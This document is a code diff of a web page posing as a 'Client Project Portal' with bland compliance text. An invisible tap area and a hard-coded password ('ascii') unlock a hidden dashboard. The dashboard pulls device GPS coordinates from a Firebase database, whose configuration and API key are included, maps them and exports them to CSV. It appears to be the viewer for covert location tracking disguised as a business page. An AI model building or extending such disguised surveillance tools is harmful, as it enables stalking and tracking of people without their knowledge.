@@ -1,114 +1,73 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Client Project Portal</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
   <style>
     body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: #f5f5f5;
-      color: #222;
+      padding: 0;
+      background: #f4f4f4;
     }
-    header {
-      background-color: #002244;
-      color: white;
-      padding: 1rem;
-      text-align: center;
-    }
-    .section {
-      padding: 1.5rem;
-      border-bottom: 1px solid #ccc;
-    }
-    h2 {
-      margin-top: 0;
-      color: #002244;
-    }
-    #tapArea {
-      min-height: 60vh;
-    }
-
-    /* Hidden admin password modal */
-    #passwordModal {
-      display: none;
-      position: fixed;
-      z-index: 10;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0,0,0,0.7);
-      justify-content: center;
-      align-items: center;
-    }
-    #passwordModal input, #passwordModal button {
-      padding: 0.6rem;
-      font-size: 1rem;
-    }
-    #adminPanel {
-      display: none;
-      padding: 2rem;
+    header, section {
+      padding: 20px;
       background: white;
+      margin-bottom: 10px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .admin-panel {
+      display: none;
+      background: #ffffff;
+      border: 1px solid #ddd;
+      padding: 20px;
+      margin: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     table {
       width: 100%;
       border-collapse: collapse;
-      margin-top: 1rem;
+      margin-top: 10px;
     }
     table, th, td {
       border: 1px solid #ccc;
     }
     th, td {
-      padding: 0.5rem;
-      text-align: center;
+      padding: 8px;
+      text-align: left;
     }
-    #exportBtn {
-      margin-top: 1rem;
-      padding: 0.5rem 1rem;
+    .filter-input {
+      padding: 8px;
+      margin: 10px 0;
+      width: 100%;
+      max-width: 300px;
+    }
+    #map {
+      width: 100%;
+      height: 300px;
+      margin-top: 10px;
     }
   </style>
 </head>
-<body>
-
-  <header>
-    <h1>Client Project Portal</h1>
-  </header>
-
-  <div class="section">
-    <h2>Client Requirements</h2>
-    <p>All specifications must be approved and timestamped.</p>
-  </div>
-
-  <div class="section">
-    <h2>Terms and Review</h2>
-    <p>Final review will be automatically saved and verified upon access.</p>
-  </div>
-
-  <div class="section">
-    <h2>Legal & Compliance</h2>
-    <p>Ensure full adherence to documentation agreements.</p>
-  </div>
-
-  <!-- Tap area to reveal hidden admin login -->
-  <div id="tapArea" class="section"></div>
-
-  <!-- Password Modal -->
-  <div id="passwordModal">
-    <div style="background:white; padding:2rem; text-align:center; border-radius:10px;">
-      <p>Enter password to access admin panel:</p>
-      <input type="password" id="adminPassword" placeholder="Enter password (e.g. ASCII)" />
-      <br><br>
-      <button onclick="checkPassword()">Enter</button>
-    </div>
-  </div>
-
-  <!-- Admin Panel -->
-  <div id="adminPanel">
+<body>  <header>
+    <h2>Client Project Portal</h2>
+    <p><strong>Client Requirements:</strong> All specifications must be approved and timestamped.</p>
+    <p><strong>Terms and Review:</strong> Final review will be automatically saved and verified upon access.</p>
+    <p><strong>Legal & Compliance:</strong> Ensure full adherence to documentation agreements.</p>
+  </header>  <section>
+    <p style="opacity:0;" id="secretTrigger">Tap Area</p>
+  </section>  <div id="passwordPrompt" style="display: none; padding: 20px;">
+    <h3>Enter password to access admin panel:</h3>
+    <input type="password" id="adminPassword" placeholder="Enter password">
+    <button onclick="checkPassword()">Enter</button>
+  </div>  <div id="adminPanel" class="admin-panel">
     <h2>Admin Dashboard</h2>
-    <button id="exportBtn">Export as CSV</button>
-    <p id="logCount">Daily logs: 0</p>
-    <table>
+    <input type="text" class="filter-input" placeholder="Search by device or location..." oninput="filterTable(this.value)" />
+    <button onclick="exportCSV()">Export as CSV</button>
+    <p>Daily logs: <span id="logCount">0</span></p>
+    <table id="logTable">
       <thead>
         <tr>
           <th>Device</th>
@@ -117,17 +76,10 @@
           <th>Timestamp</th>
         </tr>
       </thead>
-      <tbody id="logTableBody">
-        <tr><td colspan="4">Loading...</td></tr>
-      </tbody>
+      <tbody></tbody>
     </table>
-  </div>
-
-  <script type="module">
-    // Firebase SDK
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
+    <div id="map"></div>
+  </div>  <script>
     const firebaseConfig = {
       apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
       authDomain: "gps-d0bab.firebaseapp.com",
@@ -138,78 +90,92 @@
       appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
     };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-    const tapArea = document.getElementById("tapArea");
-    const passwordModal = document.getElementById("passwordModal");
-    const adminPanel = document.getElementById("adminPanel");
-    const logTableBody = document.getElementById("logTableBody");
-    const logCount = document.getElementById("logCount");
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    // Hidden tap counter logic
-    let tapCounter = 0;
-    tapArea.addEventListener("click", () => {
-      tapCounter++;
-      if (tapCounter >= 5) {
-        passwordModal.style.display = "flex";
-        tapCounter = 0;
+    const secretTrigger = document.getElementById('secretTrigger');
+    let tapCount = 0;
+
+    secretTrigger.addEventListener('click', () => {
+      tapCount++;
+      if (tapCount >= 5) {
+        document.getElementById('passwordPrompt').style.display = 'block';
       }
     });
 
-    // Admin password check
     function checkPassword() {
-      const input = document.getElementById("adminPassword").value;
-      if (input.trim().toLowerCase() === "ascii") {
-        passwordModal.style.display = "none";
-        adminPanel.style.display = "block";
-        loadLogs();
+      const pass = document.getElementById('adminPassword').value;
+      if (pass.toLowerCase() === 'ascii') {
+        document.getElementById('adminPanel').style.display = 'block';
+        document.getElementById('passwordPrompt').style.display = 'none';
+        fetchData();
       } else {
-        alert("Incorrect password!");
+        alert('Incorrect password');
       }
     }
 
-    // Load logs from Firebase
-    function loadLogs() {
-      const logsRef = ref(db, "locations");
-      onValue(logsRef, (snapshot) => {
-        const logs = snapshot.val();
-        logTableBody.innerHTML = "";
-        let count = 0;
-        for (const id in logs) {
-          const log = logs[id];
-          const device = log.device || "Unknown";
-          const latitude = log.lat;
-          const longitude = log.lng;
-          const timestamp = new Date(log.timestamp).toLocaleString();
-          logTableBody.innerHTML += `
-            <tr>
-              <td>${device}</td>
-              <td>${latitude}</td>
-              <td>${longitude}</td>
-              <td>${timestamp}</td>
-            </tr>
+    function fetchData() {
+      const tbody = document.querySelector("#logTable tbody");
+      tbody.innerHTML = "";
+      let count = 0;
+      db.ref("/locations").on("value", (snapshot) => {
+        tbody.innerHTML = "";
+        const data = snapshot.val();
+        for (const key in data) {
+          const { device, lat, lng, timestamp } = data[key];
+          const tr = document.createElement("tr");
+          tr.innerHTML = `
+            <td>${device || "Unknown"}</td>
+            <td>${lat || "N/A"}</td>
+            <td>${lng || "N/A"}</td>
+            <td>${new Date(timestamp || Date.now()).toLocaleString()}</td>
           `;
+          tbody.appendChild(tr);
           count++;
+          addMapMarker(lat, lng, device);
         }
-        logCount.textContent = `Daily logs: ${count}`;
+        document.getElementById("logCount").textContent = count;
       });
     }
 
-    // Export table to CSV
-    document.getElementById("exportBtn").addEventListener("click", () => {
-      let csv = "Device,Latitude,Longitude,Timestamp\n";
-      document.querySelectorAll("#logTableBody tr").forEach(row => {
-        const cells = row.querySelectorAll("td");
-        const rowData = Array.from(cells).map(td => `"${td.textContent}"`).join(",");
-        csv += rowData + "\n";
+    function filterTable(value) {
+      const rows = document.querySelectorAll("#logTable tbody tr");
+      rows.forEach(row => {
+        row.style.display = row.textContent.toLowerCase().includes(value.toLowerCase()) ? '' : 'none';
       });
+    }
 
-      const blob = new Blob([csv], { type: "text/csv" });
-      const link = document.createElement("a");
-      link.href = URL.createObjectURL(blob);
-      link.download = "logs.csv";
-      link.click();
-    });
-  </script>
-</body>
+    function exportCSV() {
+      let csv = "Device,Latitude,Longitude,Timestamp\n";
+      document.querySelectorAll("#logTable tbody tr").forEach(row => {
+        const cols = Array.from(row.children).map(td => td.textContent);
+        csv += cols.join(",") + "\n";
+      });
+      const blob = new Blob([csv], { type: 'text/csv' });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = 'location_logs.csv';
+      a.click();
+    }
+
+    let map;
+    let markers = [];
+
+    function initMap() {
+      map = new google.maps.Map(document.getElementById("map"), {
+        center: { lat: 0, lng: 0 },
+        zoom: 2,
+      });
+    }
+
+    function addMapMarker(lat, lng, label) {
+      if (!lat || !lng) return;
+      const marker = new google.maps.Marker({
+        position: { lat: parseFloat(lat), lng: parseFloat(lng) },
+        map,
+        title: label
+      });
+      markers.push(marker);
+    }
+  </script>  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY&callback=initMap" async defer></script></body>
   </html>
